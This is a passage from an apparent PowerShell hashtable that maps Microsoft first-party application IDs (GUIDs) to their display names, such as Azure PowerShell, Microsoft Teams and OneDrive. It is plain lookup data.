    "102b3235-5b2f-432e-aee9-109e3afb15e1" = "Microsoft_Azure_IotHub"
    "11519663-03b7-4dd3-a316-5580360da33f" = "Microsoft AzureCacheExtension"
    "12128f48-ec9e-42f0-b203-ea49fb6af367" = "MS Teams Powershell Cmdlets"
    "12fb057d-b751-47cd-857c-f2934bb677b4" = "Azure NetApp Files"
    "133c4dc0-9d5f-4826-9f7b-6bb3d3867e6a" = "PADWAMigrator"
    "145fc680-eb72-4bcf-b4d5-8277021a1ce8" = "Windows Shell"
    "14638111-3389-403d-b206-a6a71d9f8f16" = "Copilot App"
    "14a2598c-aa73-409d-be42-7ac32d24a2cc" = "Dynamics 365 AI for Customer Insights UX"
    "15ddab63-ba81-45db-9bb6-6f8bc445c459" = "Clipchamp Classic"
    "163b648b-025e-455b-9937-a7f39a65d171" = "SSO Extension Intune"
    "16f9b8e9-d20b-45a1-ab9e-db2e8254508b" = "Azure Data Factory"
    "187f8db2-105c-43ce-b6ba-5d4112236e10" = "Microsoft_Azure_CloudServices_Arm"
    "189fe8f3-4e48-4a4b-9459-c230524890e6" = "AFDX-Portal-1stPartyAAD-Prod"
    "18e271e7-a818-46ad-8e73-07cb0ae64328" = "Form Recognizer Studio"
    "18ed3507-a475-4ccb-b669-d66bc9f2a36e" = "Microsoft_AAD_RegisteredApps"
    "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
    "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
    "19db86c3-b2b9-44cc-b339-36da233a3be2" = "My Signins"
    "1a20851a-696e-4c7e-96f4-c282dfe48872" = "Editor Browser Extension"
    "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
    "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
    "1c083171-cb2d-4bd1-8da2-6f1ffea5d94c" = "SupplierWeb-UI-Prod-App"
    "1c8fc834-e4ea-42f6-8f09-8db8fde75446" = "Microsoft_Azure_StackMigrate"
    "1d79f5e8-4d44-4e06-be07-b0880cf2e64e" = "Project Babylon Ibiza Extension"
    "1d9f6aaf-ea7d-4193-a99f-ad27ad037e15" = "Microsoft_Azure_CustomerHub"
    "1dee7b72-b80d-4e56-933d-8b6b04f9a3e2" = "RemoteAssistanceService"
    "1e2401ea-428f-4575-9bbf-b301f7e1eb67" = "Microsoft_Azure_AzConfig"
    "1e3e4475-288f-4018-a376-df66fd7fac5f" = "NetworkTrafficAnalyticsService"
    "1f7f6f43-2f81-429c-8499-293566d0ab0c" = "Get Help"
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
    "203f1145-856a-4232-83d4-a43568fba23d" = "Cosmos Explorer"
    "20a3058f-cd75-4115-8166-83f8c3767069" = "Microsoft_Azure_RecoveryServices"
    "21fd57f2-6ca5-43b9-b502-5611ab3b3930" = "MicrosoftSecurityCopilotAzureExtensionApp"
    "21ff6926-4d49-46ea-a34e-e9937fd65fea" = "Microsoft_Azure_WVD"
    "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
    "22b20989-8944-48d7-9b61-9f5e8b5d6c8f" = " Microsoft_Azure_Migrate"
    "22d27567-b3f0-4dc2-9ec2-46ed368ba538" = "Reading Assignments"
    "23d8f6bd-1eb0-4cc2-a08c-7bf525c67bcd" = "Power BI PowerShell"
    "243c63a3-247d-41c5-9d83-7788c43f1c43" = "Office Online Core SSO"
    "26109b29-37da-419b-9fe3-c080749aac85" = "Liftr portal extension app for ms graph"
    "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
    "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
    "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
    "2793995e-0a7d-40d7-bd35-6968ba142197" = "My Apps"
    "291524a3-5e57-4e82-a38d-62f56293190f" = "Microsoft_Azure_FlowLog_FirstPartyApp"
    "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
    "29eb068f-2f54-4fda-a8be-32f37312678a" = "Viva Goals Web App"
    "2a508b4a-9a5e-45ee-a60a-6380ede07f65" = "Microsoft_AAD_ERM"
    "2ad88395-b77d-4561-9441-d0e40824f9bc" = "Dynamics 365 Development Tools"
    "2b479c68-8d9b-4e27-9d85-5d74803de734" = "Virtual Visits App"
    "2bc50526-cdc3-4e36-a970-c284c34cbd6e" = "Microsoft Business Office Add-in"
    "2bc7f11e-e2f4-4a09-b5e0-6988f60a8b0f" = "Azure Connected Machine Agent"
    "2c1229aa-16c5-4ff5-b46b-4f7fe2a2a9c8" = "ODBC Client Driver"
    "2c5c329a-bf00-470c-9416-b6f9e550c3b0" = "OneLake file explorer"
    "2c879423-ba8d-42b3-9fb4-a444905905c4" = "Microsoft_Azure_ActivityLog"
    "2caeb7e8-ee9a-4f10-998f-2e7a329b6c49" = "Signup Client"
    "2cfc91a4-7baa-4a8f-a6c9-5f3d279060b8" = "Azure Application Change Service"
    "2d4d3d8e-2be3-4bef-9f87-7875a61c29de" = "OneNote"
    "2ddfbe71-ed12-4123-b99b-d5fc8a062a79" = "Microsoft Teams Admin Portal Service"
    "2e246ed0-1ec0-4526-a2de-9e9ff9468494" = "Microsoft Power Automate SDX Plugin"
    "2e307cd5-5d2d-4499-b656-a97de9f52708" = "Modern Workplace Customer API Native"
    "2e49aa60-1bd3-43b6-8ab6-03ada3d9f08b" = "Dynamics Data Integration"
    "2f3b013e-5dc4-4b2a-831f-47ba08353237" = "Microsoft Dynamics 365 Project Service Automation Add-in for Microsoft Project"
    "2f7b4d11-d621-4079-9798-27f548d681f1" = "Power Cards"
    "2fd908ad-0664-4344-b9be-cd3e8b574c38" = "Microsoft.Data.SqlClient"
    "3094c60e-793a-4caf-8a58-0e2e78546847" = "VLCentral_Home"
    "30e8c77f-acd9-453f-958a-82baf329c73d" = "PowerBI Teams Extension"
    "3420270d-958d-47dd-b212-d94442460036" = "Microsoft Payment Central Prod"
    "344280e9-601d-401c-b634-416276f48e3e" = "Microsoft_Azure_EdgeGateway"
    "3686488a-04fc-4d8a-b967-61f98ec41efe" = "Microsoft Azure KeyVault portal extension"
    "36c50012-7aa1-4bff-9ff8-51c75190ae4d" = "Trident-Spark-IDE"
    "373aedd7-18be-428f-81e6-8174c02cf6d8" = "SalesConversationIntelligenceProd"
    "386ce8c0-7421-48c9-a1df-2a532400339f" = "Power Automate Desktop For Windows"
    "38a893b6-d74c-4786-8fe7-bc3b4318e881" = "Microsoft Flow Portal GCC"
    "392c0cd5-b73d-42f5-9e94-49904793f11c" = "Microsoft Virtual Events Portal"
    "3a4d129e-7f50-4e0d-a7fd-033add0a29f4" = "Enterprise Dashboard Project"
    "3aa85724-c5ce-42f5-b7f9-36b5a387b7b4" = "Windows Admin Center"
    "3ab9b3bc-762f-4d62-82f7-7e1d653ce29f" = "Microsoft Volume Licensing"
    "3b511579-5e00-46e1-a89e-a6f0870e2f5a" = "Windows 365 Portal"
    "3b68e96c-82d3-41b3-99b8-56c260cf38d8" = "Managed Home Screen"
    "3cb0f710-95bd-4d6b-8351-0bbd5b529128" = "Windows Insider Web  - Dev"
    "3cbcded7-0049-4401-9e00-5f4f10f75efe" = "1ES Resource Management"
    "3cf6df92-2745-4f6f-bbcf-19b59bcdb62a" = "Office 365 Client Admin"
    "3d5cffa9-04da-4657-8cab-c7f074657cad" = "M365 Commerce Client"
    "3dd3a51e-8d76-4cca-ac35-5537c1319211" = "Windows App - iOS"
    "3e050dd7-7815-46a0-8263-b73168a42c10" = "Teams Approvals"
    "3e62f81e-590b-425b-9531-cad6683656cf" = "PowerApps - apps.powerapps.com"
    "3f1abb3f-12cc-42c3-ad06-5b608dc5fb67" = "Microsoft Intune multi-tenant management UX extension"
    "3ff8e6ba-7dc3-4e9e-ba40-ee12b60d6d48" = "Microsoft Todo web app "
    "40999017-9b1e-41ac-a81c-172453d139b7" = "Dynamics 365 AI for Customer Insights Connector"
    "417ae6eb-aac8-42c8-900c-0e50debba688" = "Universal Print Enabled Printer"
    "41839ce3-4041-4bac-8c17-0941f25d7aaf" = "Dynamics 365 Business Central Developer"
    "42aeded7-654f-4021-8573-a861f8c0eb60" = "Microsoft_Azure_Monitoring_Alerts"
    "42f00fc9-f5d0-4270-8ff8-d66b2b27d9c7" = "Microsoft.CodeSigning.PortalExt.PROD"
    "4345a7b9-9a63-4910-a426-35363201d503" = "O365 Suite UX"
    "4353526e-1c33-4fcf-9e82-9683edf52848" = "ConfidentialLedger"
    "4435c199-c3da-46b9-a61d-76de3f2c9f82" = "GitHub Actions API"
    "4481e210-f747-4590-b65b-37aa6bd1056a" = "Fidalgo Ibiza Public"
    "44a02aaa-7145-4925-9dcd-79e6e1b94eff" = "Microsoft Dynamics 365 Apps Integration"
    "4536f486-82f7-4cfc-bfcc-6cf40d5ba55a" = "Azure Quantum Website"
    "46da2f7e-b5ef-422a-88d4-2a7f9de6a0b2" = "Dev Tunnels Service"
    "46e9667d-34e6-43d8-a494-6759b3ae6a5e" = "Biz Apps Demo Hub Prod"
    "46ff7383-ea2d-47fe-92a0-e27d7dc2fee9" = "Microsoft_Azure_Monitoring"
    "472dd75b-cdf2-42a0-9fec-b86cefca8135" = "Microsoft Places for Web"
    "4765445b-32c6-49b0-83e6-1d93765276ca" = "OfficeHome"
    "477cd9f9-408b-42a1-a47d-30721817f25b" = "Azure Cognitive Search Portal Extension"
    "478d8d1a-326f-49da-a58e-8f576faa4b5e" = "Threat Intelligence Portal"
    "47a4f6b2-25dc-4851-8524-fffe7360e8d4" = "Surface App"
    "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
    "4906f920-9f94-4f14-98aa-8456dd5f78a8" = "Dynamics CRM Unified Service Desk"
    "49676daf-ff23-4aac-adcc-55472d4e2ce0" = "Power Platform for Admins V2 connector"
    "499b84ac-1321-427f-aa17-267ca6975798" = "Azure DevOps"
    "4b0964e4-58f1-47f4-a552-e2e1fc56dcd7" = "FXIrisClient"
    "4b84634b-ff80-426f-bdc2-4299b1584916" = "Microsoft eCDN"
    "4ba4d253-8ed1-42a1-b919-37fad5e5f06e" = "Microsoft_AAD_GTM"
    "4d079b4c-cab7-4b7c-a115-8fd51b6f8239" = "SQL DotNet Client"
    "4d2f5175-f06b-49e2-9f4a-8e614a8abc03" = "Microsoft Exchange Hybrid Wizard"
    "4e09c6ac-4372-45b7-a977-e9f89e673e32" = "Custom Speech AI Portal"
    "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
    "4e514f29-41ca-409b-bf52-e774670e54ec" = "Visual Studio Code for Education"
    "4ec7f63c-188f-4433-9253-ccbe3021125f" = "IntuneBMR1PApp"
    "4f18ed62-806c-4424-9576-71c53ea11f49" = "Marketplace Transact Ext"
    "4f547b5f-c3f7-4d2c-a14f-0f8f1286d7d5" = "OneDriveLTI"
    "4f5d63ba-4a86-48e0-89b3-1df09c0dbb82" = "Microsoft Quantum Azure Portal"
    "4f71e121-13fa-44c9-a463-dd0fb1c56f17" = "Microsoft_Azure_SAPManagement"
    "4f8d3fcc-c1ad-411c-8421-c7a41b65ff5f" = "Microsoft_Azure_DocumentDB"
    "4fb5cc57-dbbc-4cdc-9595-748adff5f414" = "Windows 365 Client"
    "507a7586-da5c-4e86-80f2-2bc2e55ae394" = "Surface Dashboard"
    "50aaa389-5a33-4f1a-91d7-2c45ecd8dac8" = "Microsoft_Azure_PIMCommon"
    "5177bc73-fd99-4c77-a90c-76844c9b6999" = "Microsoft Remote Desktop Client"
    "51f81489-12ee-4a9e-aaae-a2591f45987d" = "Dynamics 365 Example Client Application"
    "5217e4ff-9fc6-4207-ac4e-d1cb98e21d6e" = "ContainerInsightsExt 1st Party AAD App"
    "52c2e0b5-c7b6-4d11-a89c-21e42bcec444" = "Graph Files Manager"
    "540d4ff4-b4c0-44c1-bd06-cab1782d582a" = "ODSP Mobile Lists App"
    "553a8bc3-7740-43c1-bd40-3112510766f8" = "Microsoft_Azure_EMA"
    "55747057-9b5d-4bd4-b387-abf52a8bd489" = "Azure AD Application Proxy Connector"
    "55850760-a3b5-4271-8dd2-3cd9c4d05869" = "Azure Arc UX Client - Public Cloud"
    "55e09414-9e42-455f-9708-b57bb2783137" = "GitHub Copilot for Azure in VS Code"
    "56233257-15ee-4d3d-bdcd-9aa975244e4c" = "Viva Pulse PROD"
    "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
    "5771b6e6-1c79-4c0f-940f-9d6412d465de" = "Health Bot Portal V4"
    "579a7132-0e58-4d80-b1e1-7a1e2d337859" = "Azure Storage AzCopy"
    "57da3f69-2d82-4c17-9e57-2e6d78b2dc60" = "O365 Diagnostic Service"
    "57f352fe-8f23-4781-8bae-1bbde5e1d8fd" = "CreateUiDef graph access"
    "57fb890c-0dab-4253-a5e0-7188c88b2bb4" = "SharePoint Online Client"
    "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
    "5801fbf1-8df2-4c3c-a65c-e230edf60ca2" = "Microsoft Remote Connectivity Analyzer"
    "582b2e88-6cca-4418-83d2-2451801e1d26" = "Sip Gateway UserApp"
    "58c746b0-a0b0-4647-a8f6-12dde5981638" = "Azure AD Identity Governance Insights"
    "5926fc8e-304e-4f59-8bed-58ca97cc39a4" = "Microsoft Intune portal extension"
    "598ab7bb-a59c-4d31-ba84-ded22c220dbd" = "Designer App"
    "59f0a04a-b322-4310-adc9-39ac41e9631e" = "Azure SRE Agent"
    "5a287bbb-2eb6-45e4-b133-8030c415e7fb" = "Microsoft_Azure_DiskMgmt"
    "5a6fd92b-8a2c-41d2-b3bb-98d35d258d9e" = "Azure Portal Fx Copilot Web"
    "5a9cece4-4e66-4a74-9286-da0f62578dd8" = "Engagement Insights"
    "5b0b1829-551e-44c8-ab85-e37f2437eb63" = "Capri"
    "5c17a0cf-5493-4b86-b23d-dabc1cc46f5a" = "Minit Desktop for Windows"
    "5c29b96a-51e0-40c1-b348-fbfebbe0e86c" = "Power BI Datasets Excel Add-In"
    "5c6236d6-d06b-44f2-be02-e26864ac8db2" = "Excel Copilot"
    "5d661950-3475-41cd-a2c3-d671a3162bc1" = "Microsoft Outlook"
    "5e3ce6c0-2b1f-4285-8d4b-75ee78787346" = "Microsoft Teams Web Client"
    "5eb6d742-390a-4eb3-b862-21d0166c54cf" = "M365 Dev Portals - Authentication flow"
    "5f00fd34-f302-417f-81ef-1adda179d8fd" = "Microsoft Forms Web"
    "5ff93dd1-505d-4ab5-8e70-a7c23143b3a9" = "Sticky Notes Web App"
    "60216f25-dbae-452b-83ae-6224158ce95e" = "Microsoft Dynamics CRM App for Outlook"
    "60b2e7d5-a27f-426d-a6b1-acced0846fdf" = "Microsoft Azure IPAM"
    "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
    "60dd25e4-9d08-44fa-9b18-280cff19b15b" = "Surface Hub and Microsoft Teams Room Device Management"
    "60f38cf4-a0bf-4fdf-b0b5-14d3131bc031" = "make.test.powerapps.com"
    "618dd325-23f6-4b6f-8380-4df78026e39b" = "Microsoft 365 Admin portal"
    "61ae9cd9-7bca-458c-affc-861e2f24ba3b" = "Windows Update for Business Deployment Service"
    "61c8fd69-c13e-4ee6-aaa6-24ff71c09bca" = "Teams SIP Gateway"
    "61ccfc51-60d1-470a-9dca-f78fcf640d23" = "Microsoft Service Copilot"
    "61e987ea-ea8c-4843-903e-1b58e57b7ab1" = "Microsoft Defender for APIs UI"
    "6204c1d1-4712-4c46-a7d9-3ed63d992682" = "Microsoft Flow Portal"
    "6253bca8-faf2-4587-8f2f-b056d80998a7" = "Microsoft Edge Addons Prod"
    "631d36ba-ddbd-4e88-807a-b8cd54f9b390" = "Microsoft_Azure_Billing"
    "6388acc4-795e-43a9-a320-33075c1eb83b" = "Azure Orbital Spatio"
    "63896e48-3d27-4ce2-9968-610b4af62c5d" = "Windows App - macOS"
    "6545d193-7fc3-408f-9d0b-44564575cd25" = "LandRIncentive Partner Portal SPA PROD"
    "655db33f-4580-4e63-bad1-4618764badb9" = "Dynamics 365 Guides"
    "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
    "66f1e791-7bfb-4e18-aed8-1720056421c7" = "Microsoft Azure Stream Analytics"
    "67ae0dc4-5f97-4c38-b132-65d38bbab8d1" = "Dynamics AX Workflow Editor"
    "67ccd9d7-f5c7-475c-9da0-9700c24b2e66" = "IoT Explorer App"
    "68282534-2e2f-45fa-a8ed-898bce6ba449" = "Microsoft Azure Analysis Services"
    "691458b9-1327-4635-9f55-ed83a7f1b41c" = "Microsoft_Azure_Storage"
    "69893ee3-dd10-4b1c-832d-4870354be3d8" = "AEM-DualAuth"
    "69cc3193-b6c4-4172-98e5-ed0f38ab3ff8" = "Windows 365 Ibiza Extension"
    "69cfcf0a-625d-409f-b381-8f036e2773b3" = "Azure_Digital_Twins"
    "6a8b4b39-c021-437c-b060-5a14a3fd65f3" = "Verifiable Credentials Service Admin"
    "6af07558-09e0-40fd-8af6-7759d010cf82" = "HDIUX_APP"
    "6afb4e1e-9ffa-4a21-8f59-c3ee04301388" = "Cloud Data Store Client"
    "6b11041d-54a2-4c4f-96a2-6053efe46d8b" = "HoloLens Camera Roll Upload"
    "6ba358df-b33d-4bfe-a7b7-fe139acebe7b" = "EASM PORTAL"
    "6c7e8096-f593-4d72-807f-a5f86dcc9c77" = "Intune Applications"
    "6d057c82-a784-47ae-8d12-ca7b38cf06b4" = "AzureVirtualNetworkManager"
    "6d8f24e8-a97e-4bb5-bbee-a1949aba8fb4" = "OfficeAIAppChatCopilot"
    "6dd7a050-74b5-4817-b5ba-fd9aad636ad7" = "PROD-FDA"
    "6e00b31f-06d4-4c93-8b14-e08b568b4a04" = "Microsoft_OperationsManagementSuite_Workspace"
    "6ee392c4-d339-4083-b04d-6b7947c6cf78" = "Azure Device Update"
    "6f0478d5-61a3-4897-a2f2-de09a5a90c7f" = "WindowsUpdate-Service"
    "6f459c5d-d670-409b-83a6-68b040f4cb78" = "Customer Experience Platform FRE PROD"
    "6f7e0f60-9401-4f5b-98e2-cf15bd5fd5e3" = "Microsoft Application Command Service"
    "701860c7-4ffa-4813-b18d-0c0af02faed7" = "Liftr-AN-FPA-Portal-AME"
    "706247ff-cdd6-4957-8377-c65e91c8d532" = "Universal Print Mac Client"
    "71a7c376-13e6-4100-968e-92ce98c5d3d2" = "Microsoft Viva Insights"
    "721b7c62-eec0-4d88-9b77-5e7c15e210a8" = "Microsoft_AAD_DomainServices"
    "73a510c3-9946-46dd-b5ae-a8f0ae68fd04" = "Azure API Management Portal extension"
    "74374a04-182f-444f-9dad-3978d27aad44" = "O365 Network Onboarding Tool"
    "74658136-14ec-4630-ad9b-26e160ff0fc6" = "ADIbizaUX"
    "756bccdc-1c1e-4556-b7a4-fe6eafe61d35" = "Azure Linux VM Sign-In"
    "75eb2b80-011a-4693-9a47-7971c853603c" = "make.powerpages.microsoft.com"
    "75f31797-37c9-498e-8dc9-53c16a36afca" = "Microsoft Planner Client"
    "760282b4-0cfc-4952-b467-c8e0298fee16" = "ZTNA Network Access Client -- Private"
    "7655d621-3c86-4a9a-92f8-47244f293b55" = "Microsoft_Entra_PM"
    "76c92352-c057-4cc2-9b1e-f34c32bc58bd" = "Azure Container Registry Application"
    "7b32d65b-837b-4365-931e-3c87e8a860aa" = "Microsoft_AAD_LifecycleManagement"
    "7b7f48f0-62d0-4183-b9ad-c2b6b4fd7aff" = "Security Copilot"
    "7c0d6b85-a577-4d00-8fcb-f583c0d8286c" = "ComplianceCenterAAD"
    "7c209960-a417-423c-b2e3-9251907e63fe" = "Azure Sphere API"
    "7c4f9118-450a-4e75-b96b-df2d0cac4c0d" = "d365-dani-exceladdinprod"
    "7dd7250c-c317-4bc6-8528-8d27b02707ef" = "ZTNA Data Acquisition - PROD"
    "7ea7c24c-b1f6-4a20-9d11-9ae12e9e7ac0" = "Teams-Toolkit"
    "7eadcef8-456d-4611-9480-4fff72b8b9e2" = "Microsoft Account Controls V2"
    "7ec03bdb-0e14-495d-9f6c-c0fd4bf2cff0" = "Microsoft Graph Data Connect - Azure Portal"
    "7f5a85eb-674c-4dee-8c57-1544c5769cfb" = "E2-PMW-Production"
    "7f67af8a-fedc-4b08-8b4e-37c4d127b6cf" = "Power BI Desktop"
    "7f7ba5f2-edd7-4b6c-af4c-f48dfb5beec5" = "Identity Protection UX"
    "7f8f922d-7ee4-40a6-b435-aad8b84ebde0" = "Org Explorer"
    "7f98cb04-cd1e-40df-9140-3bf7e2cea4db" = "JDBC Client Driver"
    "7fba38f4-ec1f-458d-906c-f4e3c4f41335" = "Sticky Notes Client"
    "801546d2-55cc-4ff4-b66d-134b1208deb5" = "Azure Commercial Services Tool - CST"
    "80331ee5-4436-4815-883e-93bc833a9a15" = "Universal Print Connector"
    "80ccca67-54bd-44ab-8625-4b79c4dc7775" = "Microsoft 365 Security and Compliance Center"
    "80ee910d-3412-4991-aa65-1380520e5ff9" = "Liftr-DT-FPA-PRT-AME"
    "80faf920-1908-4b52-b5ef-a8e7bedfc67a" = "Azure Kubernetes Service AAD Client"
    "810dcf14-1858-4bf2-8134-4c369fa3235b" = "Azure AD Identity Governance - Entitlement Management"
    "81feaced-5ddd-41e7-8bef-3e20a2689bb7" = "AMC PROD"
    "82864fa0-ed49-4711-8395-a0e6003dca1f" = "Microsoft Edge MSAv2"
    "82afb2e3-126a-42ce-a39c-b2734e769a69" = "Microsoft_Azure_PinToGrafana"
    "835b2a73-6e10-4aa5-a979-21dfda45231c" = "Azure Lab Services Portal"
    "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
    "8476fe4e-65c4-449b-b8be-98bad6ab3ea3" = "Microsoft_Azure_SupportChat"
    "84a0e9dd-6e58-4aad-82af-ebe485acd09d" = "Hubble Media Service"
    "871c010f-5e61-4fb1-83ac-98610a7e9110" = "Microsoft Power BI"
    "87223343-80b1-4097-be13-2332ffa1d666" = "Outlook Web App Widgets"
    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
    "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
    "89141436-bde0-4a2c-ad51-ebb3163e3e58" = "Azure Managed HSM Portal Extension"
    "89bee1f7-5e6e-4d8a-9f3d-ecd601259da7" = "Office365 Shell WCSS-Client"
    "8c59ead7-d703-4a27-9e55-c96a0054c8d2" = "My Profile"
    "8ec6bc83-69c8-4392-8f08-b3c986009232" = "Microsoft Teams-T4L"
    "8f10c021-391a-4dfa-894c-cca96be320f7" = "Microsoft Azure SQL"
    "90c17bc4-8398-44d4-9b47-89ed4ea32d25" = "Microsoft_Print_Extension"
    "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin Powershell"
    "9199bf20-a13f-4107-85dc-02114787ef48" = "One Outlook Web"
    "929cb005-cba1-40c4-a962-ef441029cb6c" = "make.gov.powerpages.microsoft.us"
    "929d0ec0-7a41-4b1e-bc7c-b754a28bddcc" = "Power BI Dataset Remote Connection"
    "929f5cb7-09b3-49e5-9ef6-5e7febdfa52e" = "MS Invoice Central Modern Client"
    "92ff45f0-dfb0-4078-804a-6cf3e52a3d8c" = "Microsoft Azure DataLake portal extension"
    "9315aedd-209b-43b3-b149-2abff6a95d59" = "Power Virtual Agents US Gov GCC"
    "93d53678-613d-4013-afc1-62e9e444a0a5" = "Office Online Add-in SSO"
    "9581bc0e-c952-4fd3-8d99-e777877718b1" = "Azure Singularity"
    "959678cf-d004-4c22-82a6-d2ce549a58b8" = "Microsoft_Azure_Support"
    "95a5d94c-a1a0-40eb-ac6d-48c5bdee96d5" = "Micorsoft Azure AppInsightsExtension"
    "95de633a-083e-42f5-b444-a4295d8e9314" = "Microsoft Whiteboard Services"
    "962225de-d127-40d7-ae7e-7beaa246ee3a" = "Microsoft_Azure_Security"
    "96eecda7-19ea-49cc-abb5-240097d554f5" = "Databricks SQL Connector"
    "96ff4394-9197-43aa-b393-6a41652e21f8" = "Power Virtual Agents "
    "97877f11-0fc6-4aee-b1ff-febb0519dd00" = "Azure DevOps"
    "9806d7c7-0754-4529-8da2-4bc6de638ce4" = "MS Form Excel Data Sync for SDX"
    "982bda36-4632-4165-a46a-9863b1bbcf7d" = "O365 Demeter"
    "996def3d-b36c-4153-8607-a6fd3c01b89f" = "Dynamics 365 Business Central"
    "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsoft Intune Company Portal"
    "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
    "9bd5ab7f-4031-4045-ace9-6bebbad202f6" = "Microsoft Visual Studio Services API"
    "9cdead84-a844-4324-93f2-b2e6bb768d07" = "Azure Virtual Desktop"
    "9cee029c-6210-4654-90bb-17e6e9d36617" = "Power Platform CLI - pac"
    "9d827643-d003-4cca-9dc8-71213a8f1644" = "Workplace Analytics"
    "9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7" = "Bing"
    "9ed4cd8c-9a98-405f-966b-38ab1b0c24a3" = "Microsoft Services"
    "9ee7b58d-f9db-45bc-ad7b-c2b97bbc3337" = "Defender Experts for XDR"
    "a03453e2-fed9-4e6a-8566-f141028d83e6" = "Microsoft_Azure_DataShare"
    "a0e1e353-1a3e-42cf-a8ea-3a9746eec58c" = "Microsoft AppSource"
    "a0fe4328-8965-437b-a350-cf71409d002f" = "Cloud for Nonprofit Installer"
    "a187e399-0c36-4b98-8f04-1edc167a0996" = "Microsoft Loop App"
    "a22a97f2-4a9a-41f9-9093-a747c912f4d7" = "Prod M365FLWPManagementService Prod"
    "a2a1fecc-b06e-4a1e-95c1-2afd94bcadff" = "Microsoft People"
    "a306baf0-5ad8-4f6f-babf-6a286b0142ba" = "Azure Data Factory"
    "a3bda2b7-dead-402f-8a9f-13b8ce878dc1" = "DevTest Labs Portal"
    "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
    "a522f059-bb65-47c0-8934-7db6e5286414" = "Copilot Studio - Dogfood"
    "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
    "a57aca87-cbc0-4f3c-8b9e-dc095fdc8978" = "IAM Supportability"
    "a634a778-2379-4632-92cd-6d66540ddca4" = "Microsoft_Azure_CtsExtension"
    "a670efe7-64b6-454f-9ae9-4f1cf27aba58" = "Microsoft Lists App on Android"
    "a672d62c-fc7b-4e81-a576-e60dc46e951d" = "Microsoft Power Query for Excel"
    "a6943a7f-5ba0-4a34-bf91-ab439efdda3f" = "Azure HDInsight on AKS Client"
    "a69788c6-1d43-44ed-9ca3-b83e194da255" = "Azure Data Studio"
    "a7d8b517-ace2-4c65-b0b7-38f9a2a8e9d8" = "Centralized Deployment PowerShell Tools"
    "a81833f1-fd18-490b-8598-60cd7b6b0382" = "PowerApps - apps.gov.powerapps.us"
    "a85cf173-4192-42f8-81fa-777a763e6e2c" = "Azure Virtual Desktop Client"
    "a8759234-4b8b-4d94-8c0a-ee1ab73af270" = "WindowsShareExperienceProd"
    "a8adde6c-aeb4-4fd6-9d8f-c2dfdecac60a" = "Dynamics 365 collaboration with Microsoft Teams"
    "a8f7a65c-f5ba-4859-b2d6-df772c264e9d" = "make.powerapps.com"
    "a941dc67-8fed-413a-bd6c-78b97250b257" = "Azure Service Linker Extension"
    "a94f9c62-97fe-4d19-b06d-472bed8d2bcf" = "Azure SQL Database and Data Warehouse"
    "a99783bc-5466-4cef-82eb-ebf285d77131" = "Common Job Provider"
    "aa580612-c342-4ace-9055-8edee43ccb89" = "Microsoft Teams Shifts"
    "aaa651fc-734c-48a1-8c37-ad1724b2088c" = "Microsoft Nonprofit Portal"
    "aad98258-6bb0-44ed-a095-21506dfb68fe" = "Universal Print PS Module"
    "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive SyncEngine"
    "aba285d5-d9f3-427b-a994-e9deb4567639" = "Microsoft SQL Server"
    "abba844e-bc0e-44b0-947a-dc74e5d09022" = "Domain Controller Services"
    "ac212b6d-5417-46fc-a74a-bd8f1ccf3501" = "Microsoft_Azure_FileStorage"
    "aced0c89-3b79-49ab-b2f1-27b67d3f0054" = "CPIM Portal Extension Application"
    "aebc6443-996d-45c2-90f0-388ff96faa56" = "Visual Studio Code"
    "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
    "b1d0e860-2368-4a20-97bb-067f0fb302d4" = "Microsoft Azure AttestationExtension"
    "b20d0d3a-dc90-485b-ad11-6031e769e221" = "SalesInsightsWebApp"
    "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
    "b312d4d5-a2c0-4480-b588-a5024677eb5c" = "M365 Compliance Assessment Toolkit"
    "b4c79f90-05ef-4edb-a980-de88f6952049" = "ApplicationGatewayV1ToV2CloningPortalClient"
    "b52fa633-d1c6-4449-98f2-cdab2456e94a" = "AzureDefenderForDataApp"
    "b675d171-daad-4ba1-813b-4792504ae6e2" = "Microsoft Azure Databricks portal extension"
    "b677c290-cf4b-4a8e-a60e-91ba650a4abe" = "AzurePortal Console App"
    "b743a22d-6705-4147-8670-d92fa515ee2b" = "Microsoft Intune Company Portal for Linux"
    "b87b6fc6-536c-411d-9005-110ee6db77dc" = "Yammer iPad"
    "b910b879-6c07-48aa-9cfd-d1916f62130d" = "Viva Learning Web"
    "b97b6bd4-a49f-4a0c-af18-af507d1da76c" = "Office Shredding Service"
    "b998f6f8-79d0-4b6a-8c25-5791dbe49ad0" = "ExP Studio"
    "b9a50111-7110-459d-bc13-534691bd5b7b" = "GitHub Actions API - Dev"
